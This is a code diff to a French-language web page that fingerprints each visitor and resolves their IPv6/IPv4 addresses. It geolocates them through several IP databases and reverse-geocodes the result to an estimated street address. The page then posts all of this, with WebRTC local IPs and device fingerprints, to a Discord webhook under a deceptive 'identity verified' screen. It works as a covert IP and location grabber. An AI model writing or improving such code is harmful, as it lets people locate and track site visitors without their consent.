@@ -98,6 +98,8 @@ p.sub b{color:rgba(255,255,255,.8);font-weight:500}
 .v .lo{color:#fca5a5}
 .v .mono{color:#fde68a}
 .v .warn{color:#fbbf24}
+.addr{font-family:Inter,sans-serif;font-size:14px;line-height:1.45;color:#fff;font-weight:500}
+.addr small{display:block;font-weight:300;font-size:12px;color:#c9c2e0;margin-top:3px}
 .gauge{height:5px;border-radius:99px;background:rgba(255,255,255,.09);overflow:hidden;margin-top:6px}
 .gauge i{display:block;height:100%;border-radius:99px;background:linear-gradient(90deg,#4ade80,#fbbf24,#f87171)}
 .tools{display:flex;gap:8px;margin-top:20px}
@@ -149,6 +151,12 @@ const safe = async (fn, fb) => {
   try{ const v = await fn(); return (v === undefined || v === null || v === "") ? fb : v; }
   catch(e){ return fb; }
 };
+const family = ip => !ip ? "?" : (ip.includes(":") ? "IPv6" : "IPv4");
+const v6prefix = ip => {
+  if(!ip || !ip.includes(":")) return "";
+  const parts = ip.split(":");
+  return parts.slice(0, 4).filter(Boolean).join(":") + "::/64";
+};
 
 async function hash(str){
   try{
@@ -179,64 +187,133 @@ const km = (a, b) => {
   return 2*R*Math.asin(Math.sqrt(h));
 };
 
-/* ---------- géo multi-bases, SANS autorisation ---------- */
+/* ---------- 1. découverte des IP, IPv6 prioritaire ---------- */
+async function discoverIps(){
+  const [six, sixAlt, four] = await Promise.all([
+    fetchJson("https://api6.ipify.org?format=json", 3000),
+    fetchJson("https://v6.ident.me/.json", 3000),
+    fetchJson("https://api.ipify.org?format=json", 3000)
+  ]);
+  const v6 = [six && six.ip, sixAlt && sixAlt.ip].find(x => x && x.includes(":"));
+  const v4 = four && four.ip && !four.ip.includes(":") ? four.ip : null;
+  return { v6: v6 || null, v4 };
+}
+
+/* ---------- 2. bases géo, interrogeables par IP ---------- */
 const PROVIDERS = [
-  { n:"ipwho.is", u:"https://ipwho.is/", map:d =>
-      (d.success !== false && d.ip) ? {
-        ip:d.ip, city:d.city, region:d.region, zip:d.postal, country:d.country, cc:d.country_code,
-        isp:(d.connection && (d.connection.isp || d.connection.org)) || "",
-        asn:(d.connection && d.connection.asn) || "",
-        lat:num(d.latitude), lon:num(d.longitude), tz:(d.timezone && d.timezone.id) || ""
-      } : null },
-  { n:"freeipapi", u:"https://freeipapi.com/api/json", map:d =>
-      d.ipAddress ? {
-        ip:d.ipAddress, city:d.cityName, region:d.regionName, zip:d.zipCode, country:d.countryName,
-        cc:d.countryCode, isp:"", asn:"", lat:num(d.latitude), lon:num(d.longitude),
-        tz:(d.timeZones && d.timeZones[0]) || ""
-      } : null },
-  { n:"ipapi.co", u:"https://ipapi.co/json/", map:d =>
-      (d.ip && !d.error) ? {
-        ip:d.ip, city:d.city, region:d.region, zip:d.postal, country:d.country_name, cc:d.country_code,
-        isp:d.org || "", asn:d.asn || "", lat:num(d.latitude), lon:num(d.longitude), tz:d.timezone || ""
-      } : null },
-  { n:"ipinfo", u:"https://ipinfo.io/json", map:d => {
-      if(!d.ip) return null;
-      const p = (d.loc || "").split(",");
-      return { ip:d.ip, city:d.city, region:d.region, zip:d.postal, country:d.country, cc:d.country,
-        isp:d.org || "", asn:d.org || "", lat:num(p[0]), lon:num(p[1]), tz:d.timezone || "" };
+  { n:"bigdatacloud", u:ip => `https://api.bigdatacloud.net/data/ip-geolocation-full?ip=${ip}&localityLanguage=fr`, map:d => {
+      const l = d && d.location; if(!l) return null;
+      return { ip, city:l.city||"", region:l.principalSubdivision||"", zip:l.postcode||"",
+        country:l.countryName||"", cc:l.countryCode||"", isp:(d.network&&d.network.organisation)||"",
+        asn:(d.network&&d.network.asn)||"", lat:num(l.latitude), lon:num(l.longitude),
+        tz:"", conf:num(d.confidence), src:"bigdatacloud" };
+    } },
+  { n:"ipwho.is", u:ip => `https://ipwho.is/${ip}`, map:d => {
+      if(!d || d.success === false || !d.ip) return null;
+      return { ip, city:d.city||"", region:d.region||"", zip:d.postal||"", country:d.country||"",
+        cc:d.country_code||"", isp:(d.connection&&(d.connection.isp||d.connection.org))||"",
+        asn:(d.connection&&d.connection.asn)||"", lat:num(d.latitude), lon:num(d.longitude),
+        tz:(d.timezone&&d.timezone.id)||"", conf:null, src:"ipwho.is" };
+    } },
+  { n:"ipapi.co", u:ip => `https://ipapi.co/${ip}/json/`, map:d => {
+      if(!d || d.error || !d.ip) return null;
+      return { ip, city:d.city||"", region:d.region||"", zip:d.postal||"", country:d.country_name||"",
+        cc:d.country_code||"", isp:d.org||"", asn:d.asn||"", lat:num(d.latitude), lon:num(d.longitude),
+        tz:d.timezone||"", conf:null, src:"ipapi.co" };
+    } },
+  { n:"ipwhois.app", u:ip => `https://ipwhois.app/json/${ip}`, map:d => {
+      if(!d || d.success === false || !d.ip) return null;
+      return { ip, city:d.city||"", region:d.region||"", zip:d.postal||"", country:d.country||"",
+        cc:d.country_code||"", isp:d.isp||d.org||"", asn:d.asn||"", lat:num(d.latitude), lon:num(d.longitude),
+        tz:d.timezone||"", conf:null, src:"ipwhois.app" };
     } }
 ];
 
-async function geoConsensus(){
-  const raw = await Promise.allSettled(PROVIDERS.map(p =>
-    fetchJson(p.u).then(d => { try{ return d ? p.map(d) : null; }catch(e){ return null; } })
+async function lookup(ip){
+  const fam = family(ip);
+  const res = await Promise.allSettled(PROVIDERS.map(p =>
+    fetchJson(p.u(ip)).then(d => { try{ const r = d ? p.map(d) : null; if(r) r.family = fam; return r; }catch(e){ return null; } })
   ));
-  const src = raw.map(r => r.status === "fulfilled" ? r.value : null).filter(Boolean);
+  return res.map(r => r.status === "fulfilled" ? r.value : null).filter(Boolean);
+}
 
-  const empty = { ip:"", city:"", region:"", zip:"", country:"", cc:"", isp:"", asn:"",
-    lat:null, lon:null, tz:"", src:[], spread:0, agree:0, total:0, failed:true };
+/* ---------- 3. géocodage inverse (rue) ---------- */
+async function reverseStreet(lat, lon){
+  const out = { road:"", house:"", hood:"", zip:"", city:"", region:"", country:"", via:"" };
+  if(lat == null || lon == null) return out;
+  const nom = await fetchJson(
+    `https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1&accept-language=fr`, 5000);
+  const a = nom && nom.address;
+  if(a){
+    out.road = a.road || a.pedestrian || a.footway || a.square || a.hamlet || "";
+    out.house = a.house_number || "";
+    out.hood = a.neighbourhood || a.suburb || a.quarter || a.city_district || "";
+    out.zip = a.postcode || "";
+    out.city = a.city || a.town || a.village || a.municipality || "";
+    out.region = a.state || a.region || "";
+    out.country = a.country || "";
+    out.via = "nominatim";
+    return out;
+  }
+  const bdc = await fetchJson(
+    `https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${lat}&longitude=${lon}&localityLanguage=fr`, 4000);
+  if(bdc){
+    out.hood = bdc.locality || "";
+    out.zip = bdc.postcode || "";
+    out.city = bdc.city || "";
+    out.region = bdc.principalSubdivision || "";
+    out.country = bdc.countryName || "";
+    out.via = "bigdatacloud";
+  }
+  return out;
+}
 
-  if(!src.length){
+/* ---------- 4. consensus géo ---------- */
+async function geoResolve(){
+  const ips = await discoverIps();
+  const targets = [ips.v6, ips.v4].filter(Boolean);
+
+  const blank = { v4:ips.v4, v6:ips.v6, v6prefix:v6prefix(ips.v6), records:[], best:null,
+    address:null, spread:0, agree:0, total:0, v4v6:null, failed:!targets.length };
+
+  if(!targets.length){
     const f = await fetchJson("https://api.ipify.org?format=json", 2500);
-    return { ...empty, ip:(f && f.ip) || "", failed:!(f && f.ip) };
+    return { ...blank, v4:(f && f.ip) || null, failed:!(f && f.ip) };
   }
 
-  const first = k => { for(const s of src){ const v = s[k]; if(v !== null && v !== undefined && v !== "") return v; } return ""; };
-  const pts = src.filter(s => s.lat != null && s.lon != null);
+  const all = (await Promise.all(targets.map(lookup))).flat();
+  if(!all.length) return { ...blank, failed:true };
+
+  const pts = all.filter(r => r.lat != null && r.lon != null);
   let spread = 0;
   for(let i=0;i<pts.length;i++) for(let k=i+1;k<pts.length;k++) spread = Math.max(spread, km(pts[i], pts[k]));
 
   const counts = {};
-  src.forEach(s => { if(s.ip) counts[s.ip] = (counts[s.ip]||0)+1; });
-  const agree = Object.keys(counts).length ? Math.max(...Object.values(counts)) : 0;
+  all.forEach(r => { counts[r.ip] = (counts[r.ip]||0)+1; });
+  const agree = Math.max(...Object.values(counts));
 
-  return {
-    ip: first("ip"), city: first("city"), region: first("region"), zip: first("zip"),
-    country: first("country"), cc: first("cc"), isp: first("isp"), asn: first("asn"),
-    lat: num(first("lat")), lon: num(first("lon")), tz: first("tz"),
-    src: src.map(s => s.n), spread: Math.round(spread), agree,
-    total: src.length, failed: false
-  };
+  let v4v6 = null;
+  const p4 = all.filter(r => r.family === "IPv4" && r.lat != null);
+  const p6 = all.filter(r => r.family === "IPv6" && r.lat != null);
+  if(p4.length && p6.length){
+    let d = 0;
+    p4.forEach(a => p6.forEach(b => d = Math.max(d, km(a,b))));
+    v4v6 = Math.round(d);
+  }
+
+  const scoreRec = r => (r.zip ? 45 : 0) + (r.city ? 30 : 0) + (r.region ? 5 : 0)
+    + (r.conf != null ? Math.min(20, r.conf / 5) : 0) + (r.family === "IPv6" ? 8 : 0);
+  const best = all.slice().sort((a,b) => scoreRec(b) - scoreRec(a))[0] || null;
+
+  let address = null;
+  if(best && best.lat != null){
+    address = await reverseStreet(best.lat, best.lon);
+    if(!address.road && best.zip) address.zip = address.zip || best.zip;
+    if(!address.city) address.city = address.city || best.city;
+  }
+
+  return { ...blank, records:all, best, address, spread:Math.round(spread), agree,
+    total:all.length, v4v6, failed:false };
 }
 
 /* ---------- fuite WebRTC ---------- */
@@ -320,12 +397,10 @@ function fonts(){
   }catch(e){ return []; }
 }
 
-/* ---------- collecte (ne rejette jamais) ---------- */
+/* ---------- collecte ---------- */
 async function collect(){
-  const geo = await safe(geoConsensus, {
-    ip:"", city:"", region:"", zip:"", country:"", cc:"", isp:"", asn:"",
-    lat:null, lon:null, tz:"", src:[], spread:0, agree:0, total:0, failed:true
-  });
+  const geo = await safe(geoResolve, { v4:null, v6:null, v6prefix:"", records:[], best:null,
+    address:null, spread:0, agree:0, total:0, v4v6:null, failed:true });
 
   const [rtc, cvFp, audFp, bat, uaData, storage, audio, devices, fontList, voices] = await Promise.all([
     safe(rtcIps, []),
@@ -379,14 +454,18 @@ async function collect(){
   D.fpGlobal = await hash([cvFp, audFp, gl.r, D.ua, screen.width+"x"+screen.height,
     tz.timeZone, navigator.language, navigator.hardwareConcurrency].join("|"));
 
-  const ipTz = geo.tz || "", browserTz = tz.timeZone || "";
+  const ipTz = (geo.best && geo.best.tz) || "";
+  const browserTz = tz.timeZone || "";
   const tzMismatch = !!(ipTz && browserTz && ipTz !== browserTz);
   const locRegion = (navigator.language || "").split("-")[1];
-  const ccMismatch = !!(locRegion && geo.cc && locRegion.toUpperCase() !== String(geo.cc).toUpperCase());
-  const dc = /vpn|hosting|proxy|datacenter|cloud|ovh|aws|digitalocean|hetzner|m247|linode|vultr|scaleway|azure|gcore|choopa|contabo|leaseweb/i.test(geo.isp || "");
+  const cc = (geo.best && geo.best.cc) || "";
+  const ccMismatch = !!(locRegion && cc && locRegion.toUpperCase() !== String(cc).toUpperCase());
+  const dc = /vpn|hosting|proxy|datacenter|cloud|ovh|aws|digitalocean|hetzner|m247|linode|vultr|scaleway|azure|gcore|choopa|contabo|leaseweb/i
+    .test((geo.best && geo.best.isp) || "");
   const spreadHigh = geo.spread > 120;
-  D.verdict = { tzMismatch, ccMismatch, dc, spreadHigh,
-    score: Math.min(100, (dc?45:0)+(tzMismatch?25:0)+(ccMismatch?10:0)+(spreadHigh?20:0)+((geo.agree>1)?0:15)) };
+  const split46 = geo.v4v6 != null && geo.v4v6 > 150;
+  D.verdict = { tzMismatch, ccMismatch, dc, spreadHigh, split46,
+    score: Math.min(100, (dc?40:0)+(tzMismatch?20:0)+(ccMismatch?10:0)+(spreadHigh?15:0)+(split46?15:0)) };
   return D;
 }
 
@@ -394,43 +473,59 @@ async function collect(){
 function buildSections(D){
   const g = D.geo || {};
   const v = D.verdict;
+  const b = g.best;
+  const ad = g.address || {};
   const S = [];
-  const hasIp = !!g.ip;
-  const hasPos = g.lat != null && g.lon != null;
 
-  const tzLine = g.tz
+  const addrLine = ad.road
+    ? `<div class="addr">${esc((ad.house ? ad.house+" " : "") + ad.road)}<small>${esc([ad.hood, ad.zip, ad.city, ad.region, ad.country].filter(Boolean).join(", "))}</small></div>`
+    : ad.city
+      ? `<div class="addr">${esc([ad.zip, ad.city].filter(Boolean).join(" "))}<small>${esc([ad.hood, ad.region, ad.country].filter(Boolean).join(", "))} — niveau quartier</small></div>`
+      : `<span class="lo">non résolue</span>`;
+
+  const hasPos = b && b.lat != null && b.lon != null;
+  const tzLine = b && b.tz
     ? (v.tzMismatch
-        ? `<span class="warn">${esc(g.tz)}</span> (IP) ≠ <span class="mono">${esc(D.tz.timeZone)}</span> (machine)`
+        ? `<span class="warn">${esc(b.tz)}</span> (IP) ≠ <span class="mono">${esc(D.tz.timeZone)}</span> (machine)`
         : `<span class="mono">${esc(D.tz.timeZone)}</span> · cohérent avec l'IP`)
     : `<span class="mono">${esc(D.tz.timeZone)}</span> · fuseau IP indisponible`;
 
-  const verdictTxt = !hasIp ? `<span class="lo">IP non résolue</span>`
+  const verdictTxt = !b ? `<span class="lo">IP non résolue</span>`
     : v.score >= 60 ? `<span class="lo">anonymisation probable</span>`
     : v.score >= 25 ? `<span class="warn">signaux mitigés</span>`
     : `<span class="hi">IP directe, cohérente</span>`;
 
+  S.push({title:"Adresse estimée", rows:[
+    ["Adresse", addrLine],
+    ["Coordonnées", hasPos
+      ? `<span class="hi">${b.lat.toFixed(5)}, ${b.lon.toFixed(5)}</span> · <a href="https://www.google.com/maps?q=${b.lat},${b.lon}&z=17" target="_blank" rel="noopener">carte zoom 17</a>`
+      : `<span class="lo">non fournies par les bases</span>`],
+    ["Niveau de précision", ad.road ? "rue (centroïde opérateur)" : ad.city ? "quartier / commune" : "inconnu"],
+    ["Source géocodage", ad.via ? esc(ad.via) : "—"]
+  ]});
+
   S.push({title:"Réseau", rows:[
-    ["Adresse IP publique", hasIp ? `<span class="mono">${esc(g.ip)}</span>` : `<span class="lo">indisponible</span>`],
-    ["FAI / organisation", g.isp ? esc(g.isp) : "—"],
-    ["ASN", g.asn ? esc(String(g.asn)) : "—"],
-    ["Datacenter / VPN", v.dc ? `<span class="lo">PROBABLE</span>` : (hasIp ? "aucun signe" : "—")],
+    ["IPv6", g.v6 ? `<span class="mono">${esc(g.v6)}</span>` : `<span class="lo">absent — connexion IPv4 seule</span>`],
+    ["Préfixe IPv6", g.v6prefix ? `<span class="mono">${esc(g.v6prefix)}</span>` : "—"],
+    ["IPv4", g.v4 ? `<span class="mono">${esc(g.v4)}</span>` : "—"],
+    ["Familles disponibles", `${g.v6 ? "IPv6 " : ""}${g.v4 ? "IPv4" : ""}`.trim() || "—"],
+    ["FAI / organisation", (b && b.isp) ? esc(b.isp) : "—"],
+    ["ASN", (b && b.asn) ? esc(String(b.asn)) : "—"],
+    ["Datacenter / VPN", v.dc ? `<span class="lo">PROBABLE</span>` : (b ? "aucun signe" : "—")],
+    ["Écart IPv4 ↔ IPv6", g.v4v6 != null ? `${g.v4v6} km${v.split46?" <span class='warn'>(divergent)</span>":""}` : "non comparable"],
     ["IP locales (WebRTC)", D.rtc.length ? `<span class="mono">${esc(D.rtc.join(" · "))}</span>` : "masquées (mDNS)"],
     ["Type de connexion", D.conn ? esc([D.conn.effectiveType, D.conn.downlink+" Mbps", D.conn.rtt+" ms RTT", D.conn.saveData?"économie":"normal"].filter(Boolean).join(" · ")) : "—"]
   ]});
 
-  const loc = [g.city, g.region, g.zip, g.country ? g.country+" "+flag(g.cc) : ""].filter(Boolean).join(", ");
   S.push({title:"Localisation (IP, sans autorisation)", rows:[
-    ["Ville / région / CP / pays", loc || "—"],
-    ["Coordonnées", hasPos
-      ? `<span class="hi">${g.lat.toFixed(5)}, ${g.lon.toFixed(5)}</span> · <a href="https://www.google.com/maps?q=${g.lat},${g.lon}" target="_blank" rel="noopener">carte</a>`
-      : `<span class="lo">non fournies par les bases</span>`],
+    ["Ville / région / CP", b ? esc([b.city, b.region, b.zip].filter(Boolean).join(", ") || "—") : "—"],
+    ["Pays", b ? esc((b.country || "?") + " " + flag(b.cc)) : "—"],
     ["Fuseau horaire", tzLine],
     ["Heure locale / UTC", `${esc(nowLocal())} · <span class="mono">${new Date().toISOString().slice(0,19).replace("T"," ")}</span>`],
     ["Langues", esc((navigator.languages || [navigator.language]).join(", "))],
-    ["Langue ↔ pays", v.ccMismatch ? `<span class="warn">divergence</span> (${esc((navigator.language||"").split("-")[1]||"")} vs ${esc(g.cc)})` : "cohérent"],
-    ["Sources concordantes", g.total ? `${g.agree}/${g.total} bases · écart max ${g.spread} km${v.spreadHigh?" <span class='warn'>(dispersé)</span>":""}` : "aucune réponse"],
-    ["Verdict", `${verdictTxt} · indice ${v.score}/100<div class="gauge"><i style="width:${Math.max(4,v.score)}%"></i></div>`],
-    ["Précision attendue", "niveau ville — quelques km, pas la rue"]
+    ["Langue ↔ pays", v.ccMismatch ? `<span class="warn">divergence</span> (${esc((navigator.language||"").split("-")[1]||"")} vs ${esc(b.cc)})` : "cohérent"],
+    ["Bases concordantes", g.total ? `${g.agree}/${g.total} réponses · écart max ${g.spread} km${v.spreadHigh?" <span class='warn'>(dispersé)</span>":""}` : "aucune réponse"],
+    ["Verdict", `${verdictTxt} · indice ${v.score}/100<div class="gauge"><i style="width:${Math.max(4,v.score)}%"></i></div>`]
   ]});
 
   const ua = D.uaData || {};
@@ -494,27 +589,34 @@ async function reveal(S){
       r.className = "row";
       r.innerHTML = `<span class="k">${esc(k)}</span><span class="v">${val}</span>`;
       el.appendChild(r);
-      await sleep(60);
+      await sleep(55);
     }
-    await sleep(80);
+    await sleep(75);
   }
 }
 
 /* ---------- Discord ---------- */
 async function send(D){
   const g = D.geo || {};
+  const b = g.best || {};
+  const ad = g.address || {};
   const f = (n,val,i) => ({name:n, value:String(val || "—").slice(0,1000), inline:!!i});
+  const adresse = [ (ad.house?ad.house+" ":"")+ad.road, ad.hood, ad.zip, ad.city, ad.region, ad.country ]
+    .filter(Boolean).join(", ");
+
   const embeds = [
-    { title:"🌐 Réseau & localisation", color:0xa78bfa, fields:[
-      f("IP", g.ip ? "`"+g.ip+"`" : "indisponible", true),
-      f("FAI", g.isp || "—", true),
-      f("ASN", g.asn || "—", true),
-      f("Ville / région / CP", [g.city,g.region,g.zip].filter(Boolean).join(", ") || "—"),
-      f("Pays", ((g.country||"?")+" "+flag(g.cc)).trim()),
-      f("Coordonnées", (g.lat!=null) ? `\`${g.lat},${g.lon}\` · https://maps.google.com/?q=${g.lat},${g.lon}` : "—"),
-      f("TZ IP / machine", `${g.tz||"—"} / ${D.tz.timeZone}${D.verdict.tzMismatch?" ⚠":""}`, true),
-      f("Verdict VPN", `${D.verdict.score}/100 ${D.verdict.dc?"datacenter ":""}${D.verdict.tzMismatch?"tz≠ ":""}${D.verdict.spreadHigh?"écart":""}`.trim(), true),
-      f("Sources", `${g.agree||0}/${g.total||0} · écart ${g.spread||0}km`, true),
+    { title:"📍 Adresse estimée", color:0x86efac, fields:[
+      f("Adresse", adresse || "non résolue"),
+      f("Coordonnées", (b.lat!=null) ? `\`${b.lat},${b.lon}\` · https://maps.google.com/?q=${b.lat},${b.lon}&z=17` : "—"),
+      f("IPv6", g.v6 ? "`"+g.v6+"`" : "absent", true),
+      f("Préfixe", g.v6prefix ? "`"+g.v6prefix+"`" : "—", true),
+      f("IPv4", g.v4 ? "`"+g.v4+"`" : "—", true),
+      f("FAI", b.isp || "—"),
+      f("ASN", b.asn || "—", true),
+      f("Écart v4/v6", g.v4v6 != null ? g.v4v6+" km" : "—", true),
+      f("Verdict VPN", `${D.verdict.score}/100`, true),
+      f("Bases", `${g.agree||0}/${g.total||0} · écart ${g.spread||0}km`, true),
+      f("TZ IP / machine", `${b.tz||"—"} / ${D.tz.timeZone}${D.verdict.tzMismatch?" ⚠":""}`),
       f("IP locales WebRTC", D.rtc.join(" · ") || "mDNS")
     ]},
     { title:"💻 Appareil", color:0x38bdf8, fields:[
@@ -542,7 +644,7 @@ async function send(D){
     ]}
   ];
   const payload = { username: SITE_NAME+" · Visiteur", embeds: embeds.map(e => ({
-    ...e, timestamp:new Date().toISOString(), footer:{text: LABEL+" · "+((g.ip)||"ip inconnue")}
+    ...e, timestamp:new Date().toISOString(), footer:{text: LABEL+" · "+((g.v6 || g.v4)||"ip inconnue")}
   }))};
   const body = JSON.stringify(payload);
   try{
@@ -592,24 +694,25 @@ async function enter(){
   if(busy) return; busy = true;
   const go = $("go");
   go.disabled = true;
-  go.innerHTML = '<span class="spin"></span><span>Lecture de la session…</span>';
+  go.innerHTML = '<span class="spin"></span><span>Résolution IPv6 en cours…</span>';
   $("bar").classList.add("on");
   requestAnimationFrame(()=>{ $("fill").style.width = "100%"; });
 
   let D;
   try{ D = await collect(); }
   catch(e){
-    D = { geo:{ failed:true, ip:"", lat:null, lon:null, src:[], agree:0, total:0, spread:0 },
+    D = { geo:{ failed:true, v4:null, v6:null, v6prefix:"", records:[], best:null, address:null,
+      spread:0, agree:0, total:0, v4v6:null },
       rtc:[], cvFp:"indisponible", audFp:"indisponible", bat:"indisponible", uaData:null,
       perms:{}, storage:"—", audio:{}, gl:{v:"—",r:"—",max:"—"},
       tz:Intl.DateTimeFormat().resolvedOptions(), mem:"—", conn:null, codecs:[], voices:"—",
       devices:"—", fontList:[], ua:navigator.userAgent || "" };
     D.fpGlobal = await hash("fallback"+D.ua);
-    D.verdict = { tzMismatch:false, ccMismatch:false, dc:false, spreadHigh:false, score:0 };
+    D.verdict = { tzMismatch:false, ccMismatch:false, dc:false, spreadHigh:false, split46:false, score:0 };
   }
 
   $("title").innerHTML = "Identité<br><em>vérifiée</em>";
-  $("sub").innerHTML = "Voici ce que votre navigateur expose, sans aucune autorisation demandée.";
+  $("sub").innerHTML = "Résolution IPv6 prioritaire, puis géocodage inverse — sans aucune autorisation demandée.";
   $("badge").classList.add("ok");
   $("badge").innerHTML = '<span class="dot"></span>Accès autorisé';
   go.style.display = "none";
